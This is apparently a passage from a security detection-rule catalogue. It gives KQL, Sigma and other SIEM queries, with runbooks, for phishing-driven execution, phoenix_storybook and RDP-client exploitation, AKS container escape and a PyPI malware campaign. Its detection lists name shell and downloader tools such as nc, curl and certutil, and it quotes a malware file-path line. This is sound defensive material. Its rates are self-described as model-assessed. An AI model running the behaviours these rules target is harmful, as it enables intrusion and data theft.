| project TimeGenerated, MethodName, PrincipalEmail, CallerIp, UserAgent, BucketName, LifecycleState, ProjectId
| order by TimeGenerated desc

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc

Phoenix BEAM VM spawning OS shell or LOLBin (System.cmd post-exploitation) AIExploitation High
Detects the Erlang BEAM VM (beam.smp / erl.exe / werl.exe) spawning a command interpreter or LOLBin — the canonical post-exploit signal when CVE-2026-8467 fires and the injected HEEx expression reaches System.cmd/2 or :os.cmd/1. A production Phoenix release should virtually never fork /bin/sh, cmd.exe, powershell.exe, curl, etc. Rationale: Article describes a chain where unsanitized WebSocket input flows to EEx.compile_string + Code.eval_quoted_with_env with full Kernel imports, and the PoC explicitly demonstrates System.cmd/2 — the moment that call returns, the BEAM scheduler will fork the requested OS command. Production Phoenix releases should not be spawning shell interpreters from beam.smp, so parent=beam/erl + child=shell/LOLBin is an extremely tight signal for any exploited phoenix_storybook >=0.5.0 <1.1.0 host. Cross-checked against: • https://github.com/phenixdigital/phoenix_storybook/commit/56ab8464d4375fa52db806148a06cce126ad481d • https://attack.mitre.org/techniques/T1190/
ATT&CKT1190 T1059.004 T1059.001
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Phoenix apps that legitimately use System.cmd/2 or :os.cmd/1 to wrap CLI tools (ImageMagick, ffmpeg, ghostscript) on file uploads.
  • Release tooling (mix release, distillery, edeliver) running shell hooks at boot/upgrade.
  • Observer/diagnostic tooling launched via erl.exe by an SRE that shells out to gather host info.
  • RabbitMQ / CouchDB (also Erlang/BEAM) admin scripts running on the same agent — different product but same parent image.
  • Custom Phoenix LiveView export features that call curl/wget for outbound HTTP.
Suppression filter
| where not (InitiatingProcessCommandLine has_any ("/usr/bin/convert","ImageMagick","ffmpeg","ghostscript","mix release","distillery","edeliver"))
| where not (ProcessCommandLine has_any ("convert -resize","ffmpeg -i"))
Response runbook
1) Triage: pull the full CommandLine + parent CommandLine and inspect for HEEx-injection artefacts (`{`, `"`, attribute names from PhoenixStorybook.Story.PlaygroundPreviewLive). Confirm the host runs phoenix_storybook by checking the release tree for `lib/phoenix_storybook-*/ebin`. Correlate by aid/DeviceId with inbound connections to the storybook endpoint (`/storybook`, `/live/websocket`) in the last 5 minutes. 2) Contain: isolate the device via Defender Live Response or Falcon RTR; block ingress to the storybook route at the WAF/load-balancer; rotate any application secrets the BEAM process could have read (DB passwords from runtime.exs, AWS instance role credentials). 3) Hunt: pivot on the BEAM process for new outbound connections, file writes outside the release directory, and persistence (cron, systemd units, .bashrc). Search org-wide for any other host running vulnerable phoenix_storybook versions 0.5.0–1.0.x.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("beam.smp","beam.smp.exe","erl.exe","werl.exe","erlsrv.exe","erl_child_setup")
| where FileName in~ ("sh","bash","dash","zsh","cmd.exe","powershell.exe","pwsh.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe","certutil.exe","curl.exe","curl","wget","bitsadmin.exe","nc","ncat","python","python3","perl")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName,
          ParentImage = InitiatingProcessFolderPath,
          ParentCmd   = InitiatingProcessCommandLine,
          ChildImage  = FolderPath,
          ChildCmd    = ProcessCommandLine,
          SHA256
| order by Timestamp desc
let WinChild = SecurityEvent
    | where TimeGenerated > ago(7d)
    | where EventID == 4688
    | where ParentProcessName has_any ("beam.smp","beam.smp.exe","erl.exe","werl.exe","erlsrv.exe")
    | where NewProcessName has_any ("\\cmd.exe","\\powershell.exe","\\pwsh.exe","\\wscript.exe","\\cscript.exe","\\mshta.exe","\\rundll32.exe","\\certutil.exe","\\curl.exe","\\bitsadmin.exe")
    | project TimeGenerated, Computer, Account = SubjectUserName, ParentProcessName, NewProcessName, CommandLine;
let NixChild = ImProcessCreate
    | where TimeGenerated > ago(7d)
    | where ParentProcessName has_any ("beam.smp","erl_child_setup")
    | where ActingProcessName has_any ("/sh","/bash","/dash","/zsh","/curl","/wget","/python","/python3","/perl","/nc","/ncat","/busybox")
    | project TimeGenerated, Computer = DvcHostname, Account = ActorUsername, ParentProcessName, NewProcessName = ActingProcessName, CommandLine = ActingProcessCommandLine;
WinChild | union NixChild
| order by TimeGenerated desc
title: Erlang BEAM VM Spawning Shell or LOLBin (CVE-2026-8467 Post-Exploitation)
id: 4f3a7b1e-9c2d-4e2b-86f7-4d2c1e6b9a01
status: experimental
description: Detects the Erlang BEAM virtual machine (beam.smp / erl.exe) spawning a command interpreter or LOLBin, indicative of post-exploitation of the phoenix_storybook HEEx template injection vulnerability CVE-2026-8467 reaching System.cmd/2.
references:
  - https://github.com/advisories/GHSA-55hg-8qxv-qj4p
author: SOC Detection Engineering
date: 2026/06/10
tags:
  - attack.initial_access
  - attack.execution
  - attack.t1190
  - attack.t1059.004
  - attack.t1059.001
  - cve.2026.8467
logsource:
  category: process_creation
detection:
  selection_parent:
    ParentImage|endswith:
      - '\beam.smp.exe'
      - '\erl.exe'
      - '\werl.exe'
      - '\erlsrv.exe'
      - '/beam.smp'
      - '/erl_child_setup'
  selection_child:
    Image|endswith:
      - '\cmd.exe'
      - '\powershell.exe'
      - '\pwsh.exe'
      - '\wscript.exe'
      - '\cscript.exe'
      - '\mshta.exe'
      - '\rundll32.exe'
      - '\certutil.exe'
      - '\curl.exe'
      - '\bitsadmin.exe'
      - '/sh'
      - '/bash'
      - '/dash'
      - '/zsh'
      - '/curl'
      - '/wget'
      - '/python'
      - '/python3'
      - '/perl'
      - '/nc'
      - '/ncat'
  condition: selection_parent and selection_child
falsepositives:
  - Erlang :os.cmd/1 calls from custom application code that legitimately shells out (e.g. ImageMagick wrapping, ffmpeg). Baseline first.
  - Release management scripts (mix release tasks, distillery) launched once at deploy time.
level: high
(source:windows.sysmon @EventID:1 @ParentImage:(*\\beam.smp OR *\\beam.smp.exe OR *\\erl.exe OR *\\werl.exe OR *\\erlsrv.exe OR *\\BEAM.SMP.EXE OR *\\ERL.EXE) @Image:(*\\cmd.exe OR *\\powershell.exe OR *\\pwsh.exe OR *\\wscript.exe OR *\\cscript.exe OR *\\mshta.exe OR *\\rundll32.exe OR *\\certutil.exe OR *\\curl.exe OR *\\bitsadmin.exe OR *\\CMD.EXE OR *\\POWERSHELL.EXE)) OR (source:linux.auditd @auditd.type:EXECVE @parent.process.name:(beam.smp OR erl_child_setup) @process.name:(sh OR bash OR dash OR zsh OR curl OR wget OR python OR python3 OR perl OR nc OR ncat OR busybox))
#event_simpleName=ProcessRollup2
| ParentBaseFileName=/^(beam\.smp(\.exe)?|erl\.exe|werl\.exe|erlsrv\.exe|erl_child_setup)$/i
| ImageFileName=/(\\(cmd|powershell|pwsh|wscript|cscript|mshta|rundll32|certutil|curl|bitsadmin)\.exe|\/(sh|bash|dash|zsh|curl|wget|python|python3|perl|nc|ncat|busybox))$/i
| groupBy([aid, ComputerName, UserName, ParentBaseFileName, ImageFileName, CommandLine], function=count())

BEAM/erl.exe making first-time outbound public network connection (post-RCE C2/exfil) AICommand & Control Medium
Hunts for the Erlang BEAM VM contacting a public IP/URL that has not been seen from any beam.smp/erl.exe in the org over the baseline window. CVE-2026-8467 lets an unauthenticated attacker execute arbitrary Elixir; the natural next step is :httpc.request, HTTPoison, or Finch to stage a second-stage payload or exfil data — none of which a stock Phoenix release should be doing to brand-new destinations. Rationale: Article states the injected expression runs with full Kernel imports — meaning :httpc, :inets, File, and Port modules are all usable for second-stage retrieval. Stock Phoenix release should not have beam.smp opening sockets to brand-new public destinations; leftanti baseline against 30 days of beam.smp egress is a clean way to surface only the new C2 hops without alerting on legitimate hex.pm / API integrations. Cross-checked against: • https://github.com/advisories/GHSA-55hg-8qxv-qj4p
ATT&CKT1071.001 T1105
Data sourcesNetwork_Traffic.All_Traffic
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • First API integration deployment — application starts calling a new SaaS endpoint (Stripe, SendGrid, Twilio) for the first time.
  • hex.pm / DiplomaticBag / hex-cdn fetches when an Elixir release auto-pulls dependencies at start-up.
  • Cluster mesh peers (libcluster, Distributed Erlang epmd) discovering a new node added to the fleet.
  • Outbound webhook delivery from the Phoenix app to a customer-controlled URL appearing for the first time in a multi-tenant SaaS.
  • Letsencrypt ACME challenge callbacks from a custom Phoenix-driven cert manager.
Suppression filter
| where not (RemoteUrl has_any ("hex.pm","repo.hex.pm","builds.hex.pm","github.com","objects.githubusercontent.com","acme-v02.api.letsencrypt.org","epmd"))
Response runbook
1) Triage: capture the BEAM process command line and PID, then pull all DNS lookups (`DnsRequest` / `DnsEvents`) from the same `aid`/`DeviceId` in the 60s preceding the connect — confirm whether the destination was resolved freshly by the same process. WHOIS the IP and check Falcon / VT for known C2 reputation. 2) Contain: NetworkIsolation on Defender or Falcon RTR if the destination is unknown/malicious; block the IP and any sibling addresses at the egress firewall. 3) Hunt: pivot on the BEAM PID to enumerate child processes (UC1 query), file writes under `/tmp`, `/var/tmp`, and the release directory, and any AsepValueUpdate events authored by the BEAM process. Search the same destination across all hosts org-wide regardless of process — multi-tenant C2 reuse is common.
let Baseline = DeviceNetworkEvents
    | where Timestamp between (ago(30d) .. ago(1h))
    | where InitiatingProcessFileName in~ ("beam.smp","beam.smp.exe","erl.exe","werl.exe")
    | where RemoteIPType == "Public"
    | summarize by RemoteUrl, RemoteIP;
DeviceNetworkEvents
| where Timestamp > ago(1h)
| where InitiatingProcessFileName in~ ("beam.smp","beam.smp.exe","erl.exe","werl.exe")
| where RemoteIPType == "Public"
| join kind=leftanti Baseline on RemoteIP
| project Timestamp, DeviceName,
          BeamImage = InitiatingProcessFolderPath,
          BeamCmd = InitiatingProcessCommandLine,
          RemoteUrl, RemoteIP, RemotePort, Protocol
| order by Timestamp desc
let Baseline = ImNetworkSession
    | where TimeGenerated between (ago(30d) .. ago(1h))
    | where ActingProcessName has_any ("beam.smp","erl.exe","werl.exe")
    | where ipv4_is_private(DstIpAddr) == false
    | summarize by DstIpAddr;
ImNetworkSession
| where TimeGenerated > ago(1h)
| where ActingProcessName has_any ("beam.smp","erl.exe","werl.exe")
| where ipv4_is_private(DstIpAddr) == false
| join kind=leftanti Baseline on DstIpAddr
| project TimeGenerated, DvcHostname, ActingProcessName, ActingProcessCommandLine, DstIpAddr, DstPortNumber, Url
| order by TimeGenerated desc
(source:windows.sysmon @EventID:3 @Image:(*\\beam.smp OR *\\beam.smp.exe OR *\\erl.exe OR *\\werl.exe OR *\\BEAM.SMP.EXE OR *\\ERL.EXE)) OR (source:linux.auditd @process.name:(beam.smp OR erl_child_setup) @network.direction:outbound)

Vulnerable phoenix_storybook artefact present in deployed Phoenix release (CVE-2026-8467 inventory) AIWeaponization Medium
Hunting query that surfaces hosts shipping a compiled phoenix_storybook in a Phoenix release directory at a version in the affected range (0.5.0 through 1.0.x). Useful for SOC/IR teams to scope blast radius after the advisory and to drive a patch wave to 1.1.0. Rationale: Article pins the affected range to phoenix_storybook >=0.5.0 <1.1.0 and explicitly names the two source files holding the vulnerable code (`extra_assigns_helpers.ex` and `component_renderer.ex`); their compiled `.beam` counterparts and the version-stamped release directory paths give a deterministic file-system fingerprint that's far cheaper than running an authenticated package-manager inventory across an Elixir fleet. Cross-checked against: • https://github.com/advisories/GHSA-55hg-8qxv-qj4p • https://github.com/phenixdigital/phoenix_storybook/commit/e35379dfe2ef1a71b141899e36f431017c55265d
ATT&CKT1190
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Developer laptops with the package in `~/.hex/packages/hexpm/phoenix_storybook-*` but no live Phoenix server bound to a port — true positive for inventory but not for exploit risk.
  • Build agents / CI runners that pull the dependency tree on every PR but never deploy to production.
  • Containers where the file path appears inside layered images but is masked by an overlay — same SHA reported repeatedly per container restart.
  • Demo / vendor sandboxes deliberately running the storybook on an internal-only VLAN.
Suppression filter
| where not (DeviceName has_any ("-dev","-laptop","-buildagent","-ci-","jenkins","runner-"))
Response runbook
1) Triage: confirm whether the host actually exposes the storybook route (Phoenix routes file referencing `PhoenixStorybook.Router` and an open port bound to a non-loopback interface). A vulnerable artefact on disk that never serves traffic is not exploitable. 2) Contain: for internet-exposed hosts, block `/storybook` and `/live/websocket` at the WAF/reverse proxy as a stop-gap, then schedule a patch to phoenix_storybook 1.1.0. For internal hosts, require auth in front of the storybook mount. 3) Hunt: for each hit, run the UC1 BEAM-spawning-shell query and the UC2 BEAM-egress query over the prior 30 days to rule out pre-patch exploitation. Pivot on any host where the artefact appeared *and* a BEAM child shell appeared within the same week — that's the priority IR queue.

| summarize FirstSeen = min(Timestamp), LastSeen = max(Timestamp), Paths = make_set(FolderPath, 25)

| order by FirstSeen asc

Microsoft June 2026 Patch Tuesday — exposure to 'exploitation more likely' critical CVEs AIWeaponization High
Tracks unpatched Windows endpoints carrying the four critical June 2026 CVEs Microsoft flagged as 'exploitation more likely' (CVE-2026-47291 http.sys, CVE-2026-42985 RDP Client, CVE-2026-44803 / CVE-2026-44812 Win32k-GRFX). Pre-exploit hunting — surfaces the attack surface so SOC can drive emergency-patch prioritisation before threat actors weaponise. Rationale: Grounded in the four CVE IDs Microsoft explicitly flagged 'exploitation more likely' in the article (CVE-2026-42985, CVE-2026-47291, CVE-2026-44803, CVE-2026-44812). Pivoting on DeviceTvmSoftwareVulnerabilities is the cleanest pre-exploit signal — the CVE strings are the article-specific anchor. Datadog/Falcon LogScale/CloudWatch left empty because MDVM telemetry isn't shipped to those platforms; cross-correlated with IsInternetFacing from DeviceInfo to prioritise http.sys exposure.
ATT&CKT1190 T1203 T1210
Data sourcesVulnerabilities.Vulnerabilities
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Stale TVM data on devices that already received the June KB but haven't refreshed inventory
  • WSUS-pending devices in a scheduled deferred-patch ring (e.g. pilot group, kiosks)
  • Devices with a Microsoft-documented workaround applied (http.sys binding disabled, RDP Client outbound blocked) but the binary still version-stamps as vulnerable
  • Air-gapped or maintenance-mode hosts intentionally lagging the patch cycle
  • Removed-but-cached entries from devices that have been decommissioned but not yet aged out of DeviceTvmSoftwareVulnerabilities
Suppression filter
| where IsInternetFacing == true or Priority in ("1-http.sys-network-RCE","2-RDP-client-RCE")
Response runbook
1. Triage — for each CveId hit confirm exposure is genuine by checking DeviceTvmSoftwareVulnerabilities timestamp freshness and cross-referencing WSUS / Intune deployment rings. Filter to IsInternetFacing == true first; those are the operational priorities. 2. Contain — for hosts with CVE-2026-47291 (http.sys) on internet-facing IIS / WinRM, deploy the June KB out-of-band or pull the host behind a WAF / disable the http.sys binding until patched. For workstations with CVE-2026-42985 (RDP Client), push a firewall rule blocking outbound 3389/tcp to non-corporate destinations as compensating control. 3. Hunt — pivot each exposed DeviceId into DeviceProcessEvents for anomalous SYSTEM-integrity process creation in the prior 14d, DeviceNetworkEvents for unsolicited inbound 80/443/5985 traffic on http.sys hosts, and DeviceEvents for WER application crashes naming http.sys, mstsc.exe, or win32kfull.sys — early IOCs if a public exploit is already circulating.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(2d)
| where CveId in ("CVE-2026-42985","CVE-2026-47291","CVE-2026-44803","CVE-2026-44812")
| summarize arg_max(Timestamp, *) by CveId, DeviceId
| extend Priority = case(
    CveId == "CVE-2026-47291", "1-http.sys-network-RCE",
    CveId == "CVE-2026-42985", "2-RDP-client-RCE",
    CveId in ("CVE-2026-44803","CVE-2026-44812"), "3-Win32k-GRFX-RCE",
    "4-critical")
| join kind=leftouter (DeviceInfo | summarize arg_max(Timestamp, IsInternetFacing, OSPlatform, OSVersion) by DeviceId) on DeviceId
| project Timestamp, Priority, CveId, DeviceName, OSPlatform, OSVersion, IsInternetFacing, SoftwareName, SoftwareVersion, RecommendedSecurityUpdate, RecommendedSecurityUpdateId
| order by Priority asc, IsInternetFacing desc, DeviceName asc
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(2d)
| where CveId in ("CVE-2026-42985","CVE-2026-47291","CVE-2026-44803","CVE-2026-44812")
| summarize arg_max(TimeGenerated, *) by CveId, DeviceId
| extend Priority = case(
    CveId == "CVE-2026-47291", "1-http.sys-network-RCE",
    CveId == "CVE-2026-42985", "2-RDP-client-RCE",
    CveId in ("CVE-2026-44803","CVE-2026-44812"), "3-Win32k-GRFX-RCE",
    "4-critical")
| join kind=leftouter (DeviceInfo | summarize arg_max(TimeGenerated, IsInternetFacing, OSPlatform, OSVersion) by DeviceId) on DeviceId
| project TimeGenerated, Priority, CveId, DeviceName, OSPlatform, OSVersion, IsInternetFacing, SoftwareName, SoftwareVersion, RecommendedSecurityUpdate
| order by Priority asc, IsInternetFacing desc, DeviceName asc

mstsc.exe spawns unexpected child process — RDP Client RCE post-exploit (CVE-2026-42985 + 5 related) AIExploitation Medium
Hunts the post-exploitation footprint of the six June 2026 Remote Desktop Client RCE CVEs (CVE-2026-42985, CVE-2026-42992, CVE-2026-44799, CVE-2026-44801, CVE-2026-47289, CVE-2026-48563) where a malicious RDP server triggers code execution on the connecting client. Surfaces mstsc.exe spawning any process outside its very narrow legitimate-child allowlist (conhost / rdpclip / tabtip / mstsc). Rationale: Anchored on the six June 2026 RDP Client RCE CVEs named in the article and on the article's explicit attack-vector text: 'an attacker who controls a Remote Desktop Server could initiate a remote code execution on the machine when a victim connects to the attacking server using the vulnerable Remote Desktop Client'. mstsc.exe is the named client binary. The legitimate-child allowlist (conhost / rdpclip / tabtip / mstsc / WerFault) reflects observed baseline behaviour of the binary — any other child is high-fidelity. Joined with the preceding 3389/tcp DeviceNetworkEvents in the same InitiatingProcessId to surface the malicious RDP destination directly.
ATT&CKT1203 T1219
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Administrator launching cmd.exe / mmc.exe from inside an active RDP session — this fires on the SOURCE host, not the target, but rare cases where shell extensions / launchers tunnel back
  • Custom enterprise RDP wrapper or Citrix/VMware Horizon clients that re-parent helper utilities under mstsc.exe
  • WerFault.exe spawning when mstsc.exe crashes against an unstable RDP server (excluded)
  • Microsoft Remote Desktop Connection Manager (RDCMan) or similar wrappers launching helper exes through mstsc.exe
  • Antivirus / EDR sub-process scanners reading mstsc.exe memory via a temporarily-parented helper
Suppression filter
| where not (ChildImage endswith @"\RDCMan.exe" or ParentCmd has_any ("/admin", "/v:") and ChildImage endswith_cs @"\cmd.exe" and AccountName has "admin")
Response runbook
1. Triage — pull the parent mstsc.exe command line and the preceding DeviceNetworkEvents 3389/tcp destination for the same InitiatingProcessId. Classify the RDP destination: corporate AD-joined / RFC1918 vs external public IP. External destinations during the post-Patch-Tuesday window are high-confidence RDP-Client-RCE exploitation candidates (CVE-2026-42985 et al.). 2. Contain — isolate the host via MDE network isolation / Live Response. Disable the user account and rotate their credentials; the child process executed under their token. Block the destination RDP server IP at the perimeter and submit it to threat intel. 3. Hunt — pivot the destination IP across the fleet for any other mstsc.exe outbound connections. Look for follow-on persistence on the victim (DeviceRegistryEvents Run/RunOnce/Services writes by the spawned child), credential access (LSASS handle opens, SAM hive reads), and lateral movement from the host (DeviceLogonEvents NetworkLogon initiating outbound).
DeviceProcessEvents
| where Timestamp > ago(14d)
| where InitiatingProcessFileName =~ "mstsc.exe"
| where FileName !in~ ("conhost.exe","rdpclip.exe","tabtip.exe","mstsc.exe","werfault.exe","werfaultsecure.exe")
| where AccountName !endswith "$"
| join kind=leftouter (
    DeviceNetworkEvents
    | where Timestamp > ago(14d)
    | where InitiatingProcessFileName =~ "mstsc.exe"
    | where RemotePort == 3389
    | summarize RdpDestIP = make_set(RemoteIP, 5), RdpDestUrl = make_set(RemoteUrl, 5) by DeviceId, InitiatingProcessId
  ) on $left.DeviceId == $right.DeviceId, $left.InitiatingProcessId == $right.InitiatingProcessId
| project Timestamp, DeviceName, AccountName,
          ParentImage = InitiatingProcessFolderPath,
          ParentCmd   = InitiatingProcessCommandLine,
          ChildImage  = FolderPath,
          ChildCmd    = ProcessCommandLine,
          ChildIntegrity = ProcessIntegrityLevel,
          SHA256, RdpDestIP, RdpDestUrl
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(14d)
| where EventID == 4688
| where ParentProcessName endswith @"\mstsc.exe"
| where not(NewProcessName endswith_cs @"\conhost.exe")
| where not(NewProcessName endswith_cs @"\rdpclip.exe")
| where not(NewProcessName endswith_cs @"\mstsc.exe")
| where not(NewProcessName endswith_cs @"\tabtip.exe")
| where not(NewProcessName endswith_cs @"\WerFault.exe")
| where not(NewProcessName endswith_cs @"\WerFaultSecure.exe")
| where not(SubjectUserName endswith "$")
| project TimeGenerated, Computer, SubjectUserName, SubjectDomainName, ParentProcessName, NewProcessName, CommandLine, TokenElevationType, NewProcessId, ProcessId
| order by TimeGenerated desc

AKS pod with hostNetwork:true in non-system namespace — CVE-2026-32193 container escape risk AIWeaponization Medium
Surfaces Kubernetes pod creations carrying `spec.hostNetwork: true` in user / application namespaces — the prerequisite configuration the Talos article calls out for CVE-2026-32193 (Azure Kubernetes Service path-traversal RCE). Per the article, an untrusted hostNetwork-configured container can reach host-level services not intended for unauthenticated access and break out to the AKS worker node. Rationale: Grounded directly in the article's CVE-2026-32193 description: 'an attacker who can run an untrusted container configured with host Network could send specially crafted requests to a host level service... break out of the container and gain control of the AKS worker node.' The `spec.hostNetwork: true` predicate is the exact configurable named in the article. Namespace exclusion list reflects documented Kubernetes infrastructure namespaces where hostNetwork is legitimate (CNI agents, OPA Gatekeeper, AKS managed components). hostPID and hostIPC pulled into the projection because attackers typically chain these for fuller escape — not in the filter so a hostNetwork-only deployment still fires.
ATT&CKT1611 T1610
Data sources
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Prometheus node-exporter DaemonSet deployed to a `monitoring` namespace (legitimately uses hostNetwork to scrape node metrics)
  • Cilium / Calico CNI in a non-`kube-system` namespace (some installations namespace-isolate CNI components)
  • Istio CNI / sidecar-init DaemonSets configured with hostNetwork for transparent proxying
  • NodeLocal DNSCache deployed outside kube-system
  • Custom AKS log-collection agents (Fluent Bit DaemonSet, Datadog Agent) that legitimately need hostNetwork
Suppression filter
| where ServiceAccount !in ("prometheus-node-exporter","datadog-agent","fluent-bit","nodelocaldns","cilium","calico-node","azure-cni") and ObjName !startswith "node-exporter-" and ObjName !startswith "fluent-bit-"
Response runbook
1. Triage — pull the full RequestObject pod spec. Confirm whether `hostNetwork: true` is intentional for this workload (CNI / node-exporter / log-collector). Identify the User / ServiceAccount that created the pod and the parent Deployment/DaemonSet. Check whether the container image is from a trusted registry or an external untrusted source (the CVE-2026-32193 precondition is *untrusted* container). 2. Contain — if hostNetwork is unexpected for the namespace, `kubectl delete pod` and revoke the ServiceAccount's `pods/create` permission in that namespace. Apply an Azure Policy / Gatekeeper / Kyverno admission rule blocking `hostNetwork: true` outside an explicit allowlist namespace set. Roll the AKS worker node the pod ran on (assume compromise) if confirmed malicious. 3. Hunt — review AKSAudit for other privileged pod creations (`hostPID`, `hostIPC`, `privileged: true`, `securityContext.runAsUser: 0`, hostPath volumes mounting `/var/run/docker.sock` or `/`) by the same User / ServiceA
AKSAudit
| where TimeGenerated > ago(7d)
| where Verb == "create"
| extend ObjResource = tostring(parse_json(tostring(ObjectRef)).resource)
| extend ObjNamespace = tostring(parse_json(tostring(ObjectRef)).namespace)
| extend ObjName = tostring(parse_json(tostring(ObjectRef)).name)
| where ObjResource == "pods"
| where ObjNamespace !in ("kube-system","kube-public","kube-node-lease","gatekeeper-system","calico-system","tigera-operator","azure-arc")
| extend Spec = parse_json(tostring(RequestObject)).spec
| extend HostNetwork = tostring(Spec.hostNetwork)
| extend HostPID = tostring(Spec.hostPID)
| extend HostIPC = tostring(Spec.hostIPC)
| extend ServiceAccount = tostring(Spec.serviceAccountName)
| where HostNetwork == "true"
| extend Caller = tostring(parse_json(tostring(User)).username)
| project TimeGenerated, Caller, ObjNamespace, ObjName, ServiceAccount, HostNetwork, HostPID, HostIPC, UserAgent, AuditId, _ResourceId
| order by TimeGenerated desc
source:kubernetes.audit @verb:create @objectRef.resource:pods -@objectRef.namespace:(kube-system OR kube-public OR kube-node-lease OR gatekeeper-system OR calico-system OR tigera-operator OR azure-arc) @requestObject.spec.hostNetwork:true
CLOUD
`kube_audit_index` sourcetype IN ("kube:apiserver:audit","kube:audit") verb=create objectRef.resource=pods 
| where NOT objectRef.namespace IN ("kube-system","kube-public","kube-node-lease","gatekeeper-system","calico-system","tigera-operator") 
| spath input=requestObject path=spec.hostNetwork output=hostNetwork 
| spath input=requestObject path=spec.hostPID output=hostPID 
| spath input=requestObject path=spec.hostIPC output=hostIPC 
| where hostNetwork="true" 
| table _time user.username objectRef.namespace objectRef.name hostNetwork hostPID hostIPC sourceIPs{} 
| sort -_time

Hades Campaign: Python drops Bun runtime to /tmp/b/ from oven-sh release AIInstallation High
Detects the Hades Campaign's stage-1 import hook: a Python interpreter (loading a compromised PyPI package's __init__.py) writing the Bun runtime ZIP and extracted binary into /tmp/b/. This is the malware's distinctive way to obtain a JS runtime in environments lacking Node. Rationale: Anchored on the exact paths from the deobfuscated __init__.py hook: `_b = _o.path.join(_T.gettempdir(), "b", "bun")` and `_z = _o.path.join(_T.gettempdir(), "b.zip")`. The Python+/tmp/b/ pairing is article-unique — legitimate Bun installs land in ~/.bun/bin/, never /tmp/b/.
ATT&CKT1195.002 T1059.006 T1105
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Developer manually testing Bun under /tmp during local debugging
  • Dockerfile builds that extract Bun to /tmp inside a build stage
  • CI cache restore steps that materialize a bun binary at a /tmp path
  • Engineer following oven-sh upstream install one-liner into /tmp
Suppression filter
| where not (InitiatingProcessCommandLine has_any ("oven-sh install","curl -fsSL https://bun.sh/install") and InitiatingProcessFileName in~ ("curl","bash"))
Response runbook
